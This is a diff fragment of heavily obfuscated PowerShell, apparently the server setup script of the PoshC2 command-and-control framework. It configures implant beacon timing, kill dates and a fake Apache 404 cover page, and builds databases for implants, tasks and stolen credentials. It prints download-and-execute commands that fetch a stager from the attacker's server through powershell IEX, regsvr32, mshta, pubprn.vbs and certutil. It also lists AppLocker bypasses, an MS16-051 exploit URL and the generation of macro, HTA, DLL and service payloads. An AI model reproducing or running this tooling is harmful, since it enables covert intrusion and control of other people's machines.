+        [int]${DefaU`LTb`ea`con} = ${nE`wsL`eEP} * 60
+    }
+    elseif (${d`EF`AUL`TB`EAcOn}.("{0}{1}" -f 'ToLo','wer').Invoke().("{1}{0}{2}"-f 'nt','Co','ains').Invoke('h')) { 
+        ${d`eFA`ULTbeACoN} = ${D`Ef`A`ULtBeacON} -replace 'h', ''
+        [int]${neWSlE`E`p1} = ${D`e`Fau`LtBeaC`On} 
+        [int]${NE`ws`LEEp2} = ${NEWsL`e`E`P1} * 60
+        [int]${d`Ef`AU`lTBea`CoN} = ${NeW`sl`eEP2} * 60
+    }
+    elseif (${DEf`A`Ult`BE`ACON}.("{0}{1}{2}"-f'ToLo','we','r').Invoke().("{1}{0}" -f'ains','Cont').Invoke('s')) { 
+        ${defAu`l`TBEacOn} = ${dEF`A`ULtbe`ACon} -replace 's', ''
+    } else {
+        ${defAU`LT`Be`AcoN} = ${DE`Fa`UL`T`BeACoN}
+    }
+    
+    ${k`illda`TED`efAULT} = (&("{2}{0}{1}"-f'-d','ate','get')).("{2}{1}{0}" -f's','Day','Add').Invoke(14)
+    ${k`I`LlDaTEd`ef`Ault} = (&("{1}{0}"-f'e','get-dat') -date ${K`Il`L`dA`TedE`FauLT} -Format ("{1}{2}{0}"-f 'yy','dd','/MM/yy'))
+    ${PRO`mpT} = &("{1}{2}{0}"-f't','Read-','Hos') -Prompt "[7] Enter the auto Kill Date of the implants in this format dd/MM/yyyy [$($killdatedefault)] "
+    ${KI`L`LDAte} = (${kiLlDaTEdef`A`U`Lt},${P`RO`MpT})[[bool]${P`ROm`pT}]
+    ${kil`LDaTe} =  ( VARiAblE  ("w92N"+"s4") -Val  )::("{1}{2}{0}"-f 't','ParseExa','c').Invoke(${kIlL`D`ATe},("{0}{2}{1}" -f 'dd/MM/y','yy','y'),${N`ULl})
+    ${KILld`At`efM} = &("{0}{2}{1}"-f 'Get','te','-Da') -Date ${k`iLld`ATe} -Format ("{2}{1}{0}"-f 'y','/yyy','dd/MM')
+
+    ${PRo`Mpt} = &("{2}{3}{0}{1}" -f 'd-','Host','Re','a') -Prompt "[8] Enter the HTTP port you want to use, 80/443 is highly preferable for proxying [$($defaultserverport)] "
+    ${SER`VeRPo`Rt} = (${DEfa`Ult`seRv`eR`PORT},${pR`Om`PT})[[bool]${Pr`OMpt}]
+
+    ${En`ABles`O`UnD} = "Yes"
+    ${P`R`oMpt} = &("{1}{0}{2}{3}"-f'ad','Re','-Ho','st') -Prompt "[9] Do you want to enable sound? [$($enablesound)] "
+    ${eN`A`BLE`SOUnD} = (${En`A`Bl`EsOUnD},${P`ROm`pT})[[bool]${PR`Om`pt}]
+
+    ${ENAbL`eS`MS} = "No"
+    ${pr`om`pt} = &("{1}{0}{2}"-f'd-H','Rea','ost') -Prompt "[10] Do you want to use Clockwork SMS for new payloads? [$($enablesms)] "
+    ${Ena`B`L`ESMS} = (${enA`B`L`eSms},${PROm`Pt})[[bool]${p`ROm`PT}]
+    if (${enAB`Le`S`Ms} -eq "Yes") {
+        ${A`P`IKEy} = &("{1}{2}{0}"-f'ost','Read-','H') -Prompt ("{4}{7}{0}{9}{1}{10}{5}{6}{8}{2}{3}" -f 'r Cl','c','Ke','y?','[10a] En','k ','SMS API','te',' ','o','kwor')
+        ${mObIl`E`NUmbeR} = &("{1}{3}{0}{2}"-f 'ad-Hos','R','t','e') -Prompt ("{7}{6}{9}{3}{4}{0}{8}{5}{2}{10}{1}" -f 'e ','447898....]',' t','M','obil',' send','] Ente','[10b','Number to','r ','o? [')
+    }
+
+    ${e`NaBleP`AY`lO`AdS} = "Yes"
+    ${pR`Om`Pt} = &("{2}{0}{1}"-f 'ad-','Host','Re') -Prompt "[11] Do you want all payloads or select limited payloads that shouldnt be caught by AV? [$($enablepayloads)] "
+    ${eNa`BlEP`Ayl`o`ADs} = (${Ena`BLep`AyLOA`dS},${PRo`MpT})[[bool]${pR`OM`pt}]
+    ${doWNlOaD`s`TUB} = ${uRl`S`TRI`NG} -split ","
+    ${DoWnLO`A`d`Stubu`Rl} = ${dOw`Nl`oa`dstUb}[1] -replace '"',''
+    ${neWiM`PL`AnT} = ${UrL`S`TR`INg} -split ","
+    ${n`ewIM`p`La`NtUrl} = ${NEWIMp`La`Nt}[0] -replace '"',''
+
+    ${d`oWNloa`du`Ri} = &("{2}{0}{1}{3}"-f '-R','and','Get','omURI') -Length 5
+    if (${ipv`4`ADDrEss}.("{0}{1}" -f 'Contain','s').Invoke(("{1}{0}" -f'ttps','h'))) {
+        ${Sh`o`RTCUt} = ("{5}{3}{0}{4}{2}{1}{6}" -f 'll','s ','c bypas','wershe',' -exe','po','-c ')+'"'+"[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true};IEX (new-object system.net.webclient).downloadstring('$($ipv4address):$($serverport)/$($downloadStubURL)$($downloaduri)')"+'"'+"" 
+    } else {
+        ${short`c`Ut} = ("{0}{1}{4}{2}{3}"-f'powershel','l -exec bypas','-','c ','s ')+'"'+"IEX (new-object system.net.webclient).downloadstring('$($ipv4address):$($serverport)/$($downloadStubURL)$($downloaduri)') "+'"'+""     
+    }
+
+    ${HTtprE`SpO`N`Se} = ((("{54}{55}{0}{16}{19}{12}{18}{41}{5}{7}{57}{34}{37}{38}{43}{44}{32}{48}{20}{33}{31}{49}{35}{46}{9}{4}{27}{11}{36}{15}{47}{10}{56}{39}{21}{14}{58}{30}{50}{53}{2}{13}{42}{52}{45}{25}{8}{28}{3}{51}{29}{40}{1}{17}{26}{24}{22}{6}{23}" -f'E HTM','s','e','a','>
+<h1','/DTD ','</htm','HT','>','><body','ested UR','ound<','C Zo2-/','r.',' no','1>
+<p>The ','L','s>','/I',' PUBLI','itle>','s','ody>','l>
+    ','b','dress','
+</','>Not F','Apache (Debi','erver',' o','itle','<head','404 Not Found</t','L ','/he','/h','2','.0/','a','</addre','ETF/','</','/EN','Zo2>
+<html>','>
+<ad','ad','requ','>
+<t','>
+<','n thi','n) S','p>
+<hr','s serv','
+<!DOCT','YP','L w','M','t found')) -REPlAcE  ([CHar]90+[CHar]111+[CHar]50),[CHar]34)
+
+    ${en`CK`Ey} = &("{2}{3}{1}{0}" -f'sKey','Ae','Cr','eate-')
+
+    &("{1}{0}" -f '-Item','New') ${GLOBAl:nE`Wd`ir} -Type ("{1}{0}{2}" -f'rec','di','tory') | &("{1}{2}{0}"-f 'ull','Out','-N')
+    &("{0}{1}{2}"-f'New-','I','tem') (("{1}{4}{6}{7}{0}{5}{3}{2}" -f 'rkCh','djcglobal','oads','l',':','down','new','di')).rePlACe(([cHaR]107+[cHaR]67+[cHaR]104),'\').rePlACe(([cHaR]100+[cHaR]106+[cHaR]99),[STrING][cHaR]36) -Type ("{1}{0}{2}"-f'rector','di','y') | &("{0}{1}"-f 'Out','-Null')
+    &("{1}{2}{0}"-f'm','N','ew-Ite') ((("{7}{4}{5}{3}{0}{6}{2}{1}"-f 'ir2N','s','port',':newd','lo','bal','jre','2nfg')) -CREPLaCe  '2Nj',[CHAR]92 -rePLacE([CHAR]50+[CHAR]110+[CHAR]102),[CHAR]36) -Type ("{1}{0}{2}" -f'irecto','d','ry') | &("{2}{0}{1}"-f'u','ll','Out-N')
+    &("{0}{2}{1}"-f 'Ne','-Item','w') ((("{6}{3}{1}{7}{4}{2}{5}{0}" -f 'oads','w','4N','al:ne','r','6payl','opiglob','di'))  -CrePlACE'4N6',[ChAR]92  -RepLace'opi',[ChAR]36) -Type ("{1}{0}{2}{3}"-f'ir','d','ecto','ry') | &("{1}{2}{0}"-f'l','Ou','t-Nul')
+    ${DA`Ta`BAsE} = "$global:newdir\PowershellC2.SQLite"
+
+    ${q`U`ery} = (("{27}{43}{85}{102}{51}{33}{93}{34}{109}{112}{61}{105}{100}{55}{111}{5}{20}{74}{53}{12}{86}{108}{77}{30}{110}{45}{106}{99}{29}{72}{101}{14}{67}{16}{59}{8}{31}{68}{113}{42}{60}{91}{18}{6}{97}{7}{24}{58}{90}{82}{64}{83}{25}{92}{52}{3}{96}{37}{35}{78}{50}{22}{41}{10}{11}{17}{40}{95}{62}{0}{13}{63}{44}{54}{9}{76}{114}{71}{87}{81}{103}{39}{75}{23}{104}{2}{107}{57}{116}{47}{4}{98}{73}{84}{89}{15}{88}{32}{79}{94}{65}{19}{70}{49}{46}{80}{21}{38}{69}{36}{56}{28}{66}{1}{26}{115}{117}{48}"-f 'EX','EXT,
+','
+    ','  ','      ','RIM',' TE','T,
+   ','   ',' ',' ','L','NT NOT N','T','User',' ','T,','astSe','ss',' Sl','ARY KEY A',' ','X','EXT',' ','XT,','    ','CR','oaded','VARCHAR(2','
+   ','  ','T,
+','    ','Impl','i','ds','  F','   ',' ','e','T,
+       ',' TEX','EATE T','  ',' ',' ',' ','ivot TEXT)','ep TEXT,
+','TE','  ','  ','CREME','    ','GER ','L',' Arch T','  ','
+   ','T,
+        IpAd','D ',' T',',
+ ','y T',' ',' T',' TEX','H',' Mo','e','T','0','D','UTOIN','Proxy T','P','IQUE,','rstSeen ',' ','  ','
+ ','e','E','o','ABLE Impla','ULL U','EXT,','  Alive TEX','main TEXT,
+     ','  K','dre','
+','  ','     ','n','  ','X',' ','I ','NTE','),
+        ','nts (
+','      ',',','I','   RandomUR','   ','N','ant',' ','P','I','ostname','ID ','    ','EXT,
+','P'))
+
+    &("{4}{2}{0}{1}{3}" -f'S','qliteQue','-','ry','Invoke') -Query ${Qu`eRY} -DataSource ${Da`TAbasE} | &("{2}{1}{0}" -f'Null','t-','Ou')
+
+	${qu`e`RY} = (("{3}{10}{6}{18}{16}{17}{13}{11}{20}{9}{1}{2}{8}{0}{19}{21}{4}{7}{12}{15}{5}{14}" -f'EY ','INTEGE','R PRI','CREATE TAB','REMENT ','   ',' Aut','NOT NU','MARY K',' ','LE','T','LL UNIQUE,','     ','   Task TEXT)','
+  ','uns (
+ ','  ','oR','AUTO','askID','INC'))
+
+    &("{5}{1}{2}{4}{3}{0}"-f'y','n','vo','er','ke-SqliteQu','I') -Query ${qu`e`Ry} -DataSource ${dAt`A`BAse} | &("{2}{1}{0}"-f'll','ut-Nu','O')
+
+    ${q`UErY} = (("{0}{24}{12}{19}{29}{50}{33}{49}{55}{44}{15}{8}{32}{1}{45}{5}{39}{56}{21}{9}{41}{22}{35}{7}{34}{20}{40}{28}{46}{48}{14}{30}{16}{18}{23}{6}{25}{57}{53}{26}{31}{52}{37}{11}{4}{58}{47}{3}{10}{13}{42}{36}{38}{51}{2}{27}{43}{54}{17}"-f'CREATE','k',' P',' ','X',' PR','   ','T ','dTa','OINC',' ','d TE','TABLE C',' ','  TaskI','mplete',' ','T)','TEXT,','omple','U','T','E','
+  ',' ','   Random','
+','ro','L UNIQUE,
+','ted','D',' ','s','k','N','NT NO',' O','omman','utp','IMA','L','REM','  ','mpt T','   Co','ID INTEGER','  ','
+  ','    ','s','Tas','ut TEXT,
+       ','       C','TEXT,','EX',' (
+     ','RY KEY AU','URI ','T,'))
+
+    &("{0}{1}{3}{2}{4}"-f 'Inv','oke-Sql','ue','iteQ','ry') -Query ${Que`Ry} -DataSource ${dAt`A`BASE} | &("{1}{0}{2}"-f't-Nu','Ou','ll')
+
+    ${Q`Uery} = (("{1}{4}{0}{14}{13}{20}{8}{6}{18}{12}{2}{16}{15}{9}{10}{7}{11}{5}{17}{19}{3}"-f'E TA','CR','EGE','d TEXT)','EAT','LL UNIQUE,
+        RandomURI TEXT','      TaskI','REMENT NO',' ','OI','NC','T NU','INT','Tasks (
+','BLE New',' AUT','R PRIMARY KEY',',
+    ','D ','    Comman',' '))
+
+    &("{3}{2}{0}{4}{1}"-f'te','uery','voke-Sqli','In','Q') -Query ${que`Ry} -DataSource ${Da`TaBA`Se} | &("{0}{1}"-f'Ou','t-Null')
+
+    ${Qu`ErY} = ("{17}{20}{13}{2}{15}{22}{24}{3}{21}{19}{1}{10}{23}{4}{12}{9}{7}{14}{6}{0}{18}{8}{11}{5}{16}"-f ',','Y ',' TABLE Creds (
+  ','ER PRIM','LL','
+        Hash TEX',' TEXT','am','  ','QUE,
+        Usern','AUT',' Password TEXT,',' UNI','ATE','e',' ','T)','CR','
+     ',' KE','E','ARY','    ','OINCREMENT NOT NU',' credsID INTEG')
+
+    &("{1}{0}{2}{4}{3}"-f'oke-Sql','Inv','i','ery','teQu') -Query ${q`Uery} -DataSource ${DA`TAb`AsE} | &("{2}{1}{0}"-f'll','u','Out-N')
+
+    ${q`UEry} = (("{26}{4}{54}{97}{42}{14}{133}{56}{29}{68}{52}{104}{53}{105}{2}{49}{132}{9}{137}{55}{32}{64}{50}{84}{69}{125}{39}{22}{46}{102}{0}{134}{38}{62}{33}{126}{82}{109}{127}{112}{90}{40}{35}{31}{44}{7}{41}{16}{30}{114}{66}{73}{143}{83}{108}{48}{116}{10}{93}{77}{45}{60}{61}{47}{100}{139}{110}{11}{107}{120}{15}{87}{129}{21}{58}{5}{124}{95}{89}{131}{34}{123}{70}{12}{43}{115}{103}{88}{118}{72}{8}{51}{130}{18}{119}{141}{20}{71}{67}{23}{122}{121}{78}{101}{17}{106}{136}{65}{142}{19}{76}{37}{57}{128}{63}{74}{59}{25}{13}{113}{85}{94}{79}{6}{140}{1}{75}{138}{135}{24}{99}{92}{36}{98}{81}{3}{27}{96}{80}{111}{117}{28}{91}{86}" -f 'ncKe','sURLS TE','T','  UserAge','REA','    Q',' ','u',' TEXT','ENT NOT NULL','nse TEX','r','XT,
+        ','T','2Ser','Por','p TEX','    ','ox','s','XT,
+  ',',
+   ',',
+    ','r T','   ','leNumber ','C','nt TEXT,','e','INT','T,
+   ','    ','QUE',' ','nd','  ','nsec','EX','TEXT','XT',',
+ ','ltSlee','ABLE C','Do',' Defa','     ','  ','d','Res','OI','  ',',
+        P','IMA','Y','TE','UNI',' ','T,
+    ',' ','i','  F','ol',',
+  ',' APIKEY TEXT,
+   ',',
+','yP','Kill','xyUse','EGER PR','  ','TE','      Pro','I','Da','     Mob','XT',' T','
+ ','
+   ',',
+     ','      ',',
+      ',' Do',' TEX','  ','   ',')','t TEX','d','Com',' TEXT','ferer TEXT','  I','T,',' URLS TEXT','ick','
+',' T','ure TEXT',' ','erPath TE',' ','  E','nloa','RY KE',' AU','Pr','v','T,
+        HTTP','main','     Se',' ','tHeader','EXT,
+    ','     ','w','po',' R','UR','yUR','er','XT,','E',' ','u','  HostnameIP TE','    ','Fron','   ','T','r','ma','NCREM','ver (
+        ID','y ','  ','ox',' ',',
+','XT,
+   ','  Sock','L TE','ass TEXT,
+        Sound','te'))
+
+    &("{3}{2}{4}{0}{1}{5}"-f 'SqliteQ','u','nv','I','oke-','ery') -Query ${que`RY} -DataSource ${D`AtaB`A`se} | &("{2}{0}{1}" -f'-Nul','l','Out')
+
+    ${quE`RY} = (("{8}{21}{0}{2}{26}{1}{28}{22}{14}{23}{18}{4}{12}{25}{16}{3}{13}{24}{15}{9}{20}{27}{10}{19}{11}{6}{7}{5}{17}" -f' TAB','y ','LE ','ARY KEY',' IN',' TEXT',' ','      Command','CREAT','I','NIQ','
+ ','TE',' ','  ','TO','IM',')','ID','UE,','NCREMENT N','E',' ',' ','AU','GER PR','Histor','OT NULL U','(
+    '))
+
+    &("{1}{3}{2}{0}{4}"-f 'u','In','ke-SqliteQ','vo','ery') -Query ${q`U`ery} -DataSource ${daTAB`AsE} | &("{2}{0}{1}"-f 'ut-Nu','ll','O')
+
+    ${Q`UeRY} = ((("{34}{99}{5}{13}{68}{29}{103}{56}{11}{7}{41}{43}{59}{71}{90}{40}{33}{89}{2}{67}{60}{80}{19}{96}{104}{25}{85}{98}{114}{109}{6}{83}{15}{1}{102}{76}{52}{58}{81}{63}{17}{86}{88}{53}{97}{70}{51}{115}{75}{30}{28}{14}{31}{66}{16}{61}{100}{50}{62}{65}{110}{84}{18}{22}{69}{91}{108}{74}{54}{20}{24}{78}{39}{36}{45}{95}{57}{117}{87}{94}{9}{112}{116}{82}{26}{46}{73}{42}{37}{0}{4}{93}{106}{23}{38}{92}{32}{3}{101}{113}{35}{55}{12}{77}{44}{111}{10}{8}{79}{64}{21}{105}{47}{27}{49}{107}{72}{48}" -f 'er','nloadU','der','oadU','ver',' ',' QuickCom','eep','cksU',', @HTTPR','o','l','le','I','ec',' Dow',' Us','K','    ','es','ep, @K',', @I','      VAL','ckComma','illDa',',','e','er','s','erve','In','ure','ownl','inFrontH','I','nds, @APIKEY, @M','meIP, @EncKey',' @S','nd, ','@Hostna','y, Doma',', Kil','lderPath,','lDate,','r, @UR',', @Do',', ','secure, @Us','er)','Age','t','R','d',' Mo','Sle','obi','faultS','n','s,',' ','TT','er',',','API','LS',' ',',',', H','NTO C2S','UES ','U','HostnameIP,','t, @Refer','@Fo','ult','S, SocksURLS, ','un','Numbe','te, ','R','PR',' ','ons','mand,','eferer)
+  ',' ServerP','E','H','Y,','ea',' EncKe','(','@D','Po','eader','mainFro','ponse, FolderPat','bileNumber, ','o','NSERT','Agen','RI, @','RI, So','r (De','h','n','rt, @Qui','n','@Defa',',','R','LS, @S','es','Sou','rt','L','p','t')))
+
+    &("{3}{4}{2}{1}{0}"-f'y','er','-SqliteQu','Invok','e') -DataSource ${D`A`TAbASE} -Query ${Q`UE`RY} -SqlParameters @{
+        ("{1}{2}{0}" -f 'Sleep','D','efault') = ${d`E`F`AuL`TbEACOn}
+        ("{1}{2}{0}" -f'ate','Kil','lD') = ${KI`ll`DAT`EFm}
+        ("{1}{2}{0}" -f'P','Hostn','ameI')  = ${iPV4AD`DR`eSS}
+        ("{1}{0}{2}"-f'n','E','cKey')  = ${eN`cKEy}
+        ("{1}{0}{2}{3}" -f 'ea','DomainFrontH','de','r')  = ${Do`maiNFROn`Th`Eader}
+        ("{2}{3}{1}{0}"-f'e','ns','HTTPRe','spo') = ${hTtP`Re`s`POnsE}
+        ("{1}{0}{2}" -f'erP','Fold','ath') = ${glO`BA`L`:nEw`dIR}
+        ("{2}{1}{0}"-f't','rPor','Serve') = ${Serv`ERp`O`Rt}
+        ("{1}{0}{2}" -f 'ick','Qu','Command') = ${S`hO`RtCuT}
+        ("{2}{0}{1}" -f'wn','loadURI','Do') = ${d`OwNl`oA`DURI}
+        ("{1}{0}" -f'unds','So') = ${eNA`BL`Es`oUnd}
+        ("{0}{1}"-f 'API','KEY') = ${APik`EY}
+        ("{0}{1}{3}{2}" -f'Mo','b','Number','ile') = ${moBI`LE`NumBEr}
+        ("{0}{1}" -f 'URL','S') = ${UR`LsTr`inG}
+        ("{1}{0}{2}" -f'URL','Socks','S') = ${SOCkSu`R`lStR`INg}
+        ("{0}{1}"-f'I','nsecure') = ${I`NSeCU`RE}
+        ("{0}{1}"-f'Us','erAgent') = ${us`er`AG`enT}
+        ("{0}{1}{2}" -f 'Ref','ere','r') = ${rE`FErEr}
+    } | &("{0}{2}{1}"-f 'Out-Nu','l','l')
+
+    ${H`Ost}."u`I"."RAW`UI"."Wi`N`dOwTI`Tle" = ('P'+'oshC2 '+'Serve'+'r: '+"$ipv4address "+'P'+'ort '+"$serverport")
+    &("{0}{1}{2}" -f 'Write-H','os','t') ((("{8}{1}{6}{3}{4}{0}{7}{9}{5}{2}" -f'ey:','Uniqu','y','cr','yption K','Ke','e En',' HF','
+PoshC2 ','nEnc'))-CrePLAcE'HFn',[CHaR]36)
+
+    &("{0}{1}{2}" -f 'Wri','te','-Host') (("{2}{7}{12}{3}{14}{4}{0}{9}{13}{1}{11}{8}{10}{5}{6}" -f'es ','en to: 5V','
+Ap','r','rite rul','ache','.conf','ach','bal:newdirS3','wr','nap','jglo','e ','itt','ew')).REpLACE(([CHaR]53+[CHaR]86+[CHaR]106),'$').REpLACE(([CHaR]83+[CHaR]51+[CHaR]110),'\') -ForegroundColor ("{1}{0}"-f'een','Gr')
+    &("{2}{1}{0}" -f 'le','ut-Fi','O') -InputObject ${APA`C`he} -Encoding ("{0}{1}"-f 'asc','ii') -FilePath "$global:newdir\apache.conf"
+        
+    &("{0}{1}{2}"-f'Write','-','Host') ((("{9}{7}{8}{4}{5}{13}{3}{11}{6}{10}{2}{0}{1}{12}"-f' {0}k','ill','ll Date','}server',': {0}','ipv4address Po',' (HTTP) {1} ','g',' on','
+Listenin','Ki','port','datefm
+','rt {0'))-f[CHAR]36,[CHAR]124) -ForegroundColor ("{0}{1}"-f 'Gr','een')
+    &("{2}{0}{1}" -f'-','Host','Write') ("{1}{2}{6}{4}{9}{5}{8}{7}{3}{0}" -f 'ng, run:','To q','ui','i','y','nter','ckl','pentest','nal ',' get setup for i')
+
+    &("{3}{0}{2}{1}" -f'ho','t','s','write-') ${Sh`Ortc`UT} ('
+') -ForegroundColor ("{0}{1}"-f 'gre','en')
+    &("{0}{2}{1}" -f 'wr','ost','ite-H') ((("{15}{18}{14}{2}{4}{16}{7}{1}{12}{34}{6}{26}{17}{0}{24}{36}{37}{22}{29}{3}{5}{27}{11}{13}{21}{20}{23}{8}{32}{31}{10}{30}{25}{28}{9}{19}{33}{35}"-f ', N','bTe','stealt','o','hy a','t','s hidd',' use Su','d S',' o','es ','w','e','ork ','ore ','For a','pproach,','gems',' m','ver',' ','with',' do','untruste','OTE','f ','en ',' ','using',' n','i','t','SL certifica',' HTTPS','{0}',':',': Th','ese')) -f  [cHar]39)
+    &("{0}{2}{3}{1}"-f'w','t','rite','-hos') "regsvr32 /s /n /u /i:$($ipv4address):$($serverport)/$($downloadStubURL)$($downloaduri)_rg scrobj.dll " -ForegroundColor ("{1}{0}" -f'n','gree')
+    &("{0}{2}{1}"-f 'wr','-host','ite') "cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs printers `"script:$($ipv4address):$($serverport)/$($downloadStubURL)$($downloaduri)_cs`" " -ForegroundColor ("{1}{0}"-f'een','gr')
+    &("{0}{1}{2}"-f'write','-hos','t') "mshta.exe vbscript:GetObject(`"script:$($ipv4address):$($serverport)/$($downloadStubURL)$($downloaduri)_cs`")(window.close) " -ForegroundColor ("{0}{1}"-f'gre','en')
+    &("{0}{2}{1}"-f 'writ','st','e-ho') ""
+    &("{2}{3}{1}{0}" -f 'Host','te-','w','ri') ((("{14}{22}{8}{6}{16}{12}{2}{0}{24}{5}{7}{18}{23}{9}{19}{3}{17}{13}{10}{4}{11}{1}{21}{15}{20}" -f 'oJ','certificates if us','tNetT','t','ed S','n execution','ha',',','ors','o','t','SL ','{0}s Do','rus','Or use ','g over HTTP','w',' work with unt',' NOTE','es no','S:','in','F',': This d','S to obtai')) -F[char]39)
+    &("{1}{2}{0}" -f 'st','w','rite-ho') "mshta.exe vbscript:GetObject(`"script:$($ipv4address):$($serverport)/$($downloadStubURL)$($downloaduri)_js`")(window.close) " -ForegroundColor ("{1}{0}" -f 'n','gree')
+    &("{1}{0}{2}"-f'o','write-h','st') "cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs printers `"script:$($ipv4address):$($serverport)/$($downloadStubURL)$($downloaduri)_js`" " -ForegroundColor ("{1}{0}" -f'een','gr')
+    &("{2}{0}{3}{1}"-f 'ite-h','st','wr','o') ""
+    &("{3}{0}{2}{1}"-f 'it','Host','e-','wr') ("{9}{0}{5}{8}{13}{4}{1}{12}{2}{3}{10}{11}{6}{14}{15}{7}"-f' ',' ','ui','va','er or','By','nstallUtil.',':','pass ','To','le','nt, use I','eq','AppLock','ex','e or Regasm')
+    &("{0}{2}{1}"-f 'w','-host','rite') ((('C:qY3Win'+'dow'+'s'+'qY3Micr'+'osoft'+'.NETqY3'+'FrameworkqY3v4'+'.0.30319q'+'Y3'+'Insta'+'l'+'lUtil.exe ') -RePLACE'qY3',[CHAR]92)+'/lo'+'gfile'+'='+' '+'/L'+'ogT'+'oConsole=f'+'alse '+'/U'+' '+"$global:newdir\payloads\posh.exe") -ForegroundColor ("{0}{1}"-f'gre','en')
+    &("{0}{1}{2}"-f 'wri','te-hos','t') (('C:{0'+'}Wi'+'ndo'+'w'+'s{0}Mic'+'rosof'+'t.NET{0}F'+'ra'+'mework{0'+'}v4.0.3031'+'9{'+'0'+'}regasm.ex'+'e ')  -f[cHAr]92+'/'+'U '+"$global:newdir\payloads\posh.exe") -ForegroundColor ("{1}{0}" -f'een','gr')
+    &("{2}{0}{1}" -f 'e-ho','st','writ') ""
+    &("{2}{0}{1}{3}"-f'rite','-H','w','ost') ("{0}{9}{1}{5}{7}{3}{8}{10}{6}{2}{4}"-f 'To ex','i','e t','S16','he following URL:','t ','us','M','-051 via IE9','plo','-11 ')
+    &("{0}{3}{1}{2}"-f 'wr','e-hos','t','it') "$($ipv4address):$($serverport)/$($downloadStubURL)$($downloaduri)_ms16-051" -ForegroundColor ("{1}{0}" -f'n','gree')
+    &("{1}{0}{2}" -f'it','wr','e-host') ""
+    &("{1}{0}{3}{2}"-f 'ite','wr','t','-Hos') ("{4}{1}{19}{18}{10}{12}{17}{6}{9}{14}{15}{16}{7}{5}{0}{3}{11}{13}{2}{8}" -f ' ','ownl','URL','use the followi','To d','ble','Ut','xecuta',':','i','C2','n',' Instal','g ','l/G','ene','ral e','l',' Posh','oad')
+    &("{2}{0}{1}" -f'it','e-host','wr') "cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs printers `"script:$($ipv4address):$($serverport)/$($downloadStubURL)$($downloaduri)_df`" " -ForegroundColor ("{0}{1}" -f'g','reen')
+    &("{3}{2}{0}{1}"-f 's','t','rite-ho','w') ("certutil -urlcache -split -f $($ipv4address):$($serverport)/$($downloadStubURL)$($downloaduri)_iu %temp%\\$($downloaduri)_iu ") -ForegroundColor ("{1}{0}"-f 'n','gree')
+    &("{1}{2}{0}"-f'e-host','w','rit') ""
+
+    
+    
+    &("{0}{1}{2}" -f 'Write-','Ho','st') -Object ("{1}{0}"-f'or ','F') -NoNewline
+    &("{1}{2}{0}"-f 'st','Write','-Ho') -Object ("{1}{0}{3}{2}"-f'e','Red T','ing ','am') -NoNewline -ForegroundColor ("{0}{1}"-f 'R','ed')
+    &("{0}{1}{2}" -f 'Wri','te-H','ost') -Object ("{7}{9}{1}{6}{2}{0}{11}{4}{3}{8}{5}{10}" -f'es','i','i','l','use the fo','yload','t','acti','lowing pa','v','s:',', ')
+    
+    &("{3}{0}{1}{2}" -f 't-Mod','ul','e','Impor') ((("{3}{1}{2}{5}{0}{4}" -f'ads.ps','hPath{1}','C2-','{0}Pos','1','Paylo')) -f [CHar]36,[CHar]92) 
+    if (${IN`SE`CuRe} -eq "YES") {
+        ${cO`Mm`AnD} = &("{2}{4}{0}{1}{3}" -f'ea','tedro','c','pper','r') -enckey ${enC`key} -killdate ${K`IllD`At`efm} -domainfrontheader ${DOMa`infrO`NThEAd`er} -ipv4address ${IPv4`AddR`ESs} -serverport ${seR`V`erPo`RT} -useragent ${U`seR`Ag`eNT} -Insecure -Referer ${ReF`eR`eR}
+    } else {
+        ${Com`MA`ND} = &("{1}{0}{2}{3}" -f'ted','crea','ro','pper') -enckey ${eN`CKEY} -killdate ${KI`llD`AtefM} -domainfrontheader ${dOm`AiNFR`On`TH`eAdEr} -ipv4address ${IpV`4aDdR`esS} -serverport ${se`Rv`e`RpORt} -useragent ${USeR`AGe`NT} -Referer ${rE`F`erER}
+    }
+    ${PAylO`AD} = &("{2}{4}{1}{3}{0}"-f 'payload','ra','creat','w','e') -command ${C`OMMAnd}
+
+    if (${enA`B`Le`payLO`AdS} -eq "Yes") {
+        
+        &("{1}{2}{0}" -f'oad','Cr','eatePayl')
+        &("{4}{0}{1}{3}{2}" -f 'ateSt','a','dAloneExe','n','Cre')
+        &("{1}{4}{0}{3}{2}" -f 'TAPaylo','Cr','d','a','eateH')
+        &("{4}{3}{2}{1}{0}" -f'd','loa','oPay','ateMacr','Cre')
+        &("{0}{6}{3}{1}{4}{2}{5}" -f 'C','6','051-Pa','S1','-','yload','reate-M')
+        &("{0}{2}{1}" -f'Cre','nk','ateLi')
+        &("{1}{3}{0}{2}"-f'ervice','Create','Exe','S')
+        &("{3}{1}{2}{0}" -f'yload','reateJ','avaPa','C')
+        &("{0}{2}{1}"-f'cre','tedll','a')
+        &("{0}{1}" -f 'po','shjs')
+        &("{1}{0}{2}"-f'_s','rg','ct')
+        &("{1}{0}"-f 't','cs_sc')
+        &("{0}{1}" -f 'df_','sct')
+    } else {
+        
+        &("{0}{1}{2}" -f'C','reatePa','yload')
+        &("{1}{2}{4}{3}{5}{0}"-f 'Exe','Creat','eS','Al','tand','one')
+        &("{4}{2}{3}{0}{1}"-f 'vice','Exe','r','eateSer','C')
+        &("{0}{1}"-f 'rg_','sct')
+        &("{1}{0}"-f 's_sct','c')
+        &("{0}{1}" -f 'df_','sct')
+    }
+    
+    
+    &("{0}{2}{3}{1}" -f'S','Process','t','art-') -FilePath ("{3}{0}{1}{2}{4}"-f 'rshell','.','ex','powe','e') -ArgumentList (' '+'-NoP'+' '+'-'+'Com'+'mand '+'import-m'+'odu'+'le'+' '+"$PoshPath\Implant-Handler.ps1; "+'Im'+'p'+'lant-'+'Ha'+'ndler '+'-Fo'+'lde'+'rPat'+'h '+"'$global:newdir' "+'-'+'PoshPa'+'th '+"'$PoshPath'")
+    &("{2}{1}{0}" -f 'st','te-Ho','Wri') ("{14}{11}{13}{9}{4}{7}{15}{0}{5}{3}{12}{10}{6}{8}{1}{2}"-f'use the foll','directo','ry: ','ng',' C2Server','owi','n th',',','is ','e Implant-Handler or',' i','r',' shortcuts','e-open th','
+To ',' ')
+    &("{2}{0}{1}"-f'-','Host','Write') "$global:newdir" ('
+')  -ForegroundColor ("{1}{0}" -f'n','Gree')
+    ${sO`UR`CeeXE} = ("{2}{1}{3}{0}" -f'l.exe','owe','p','rshel')
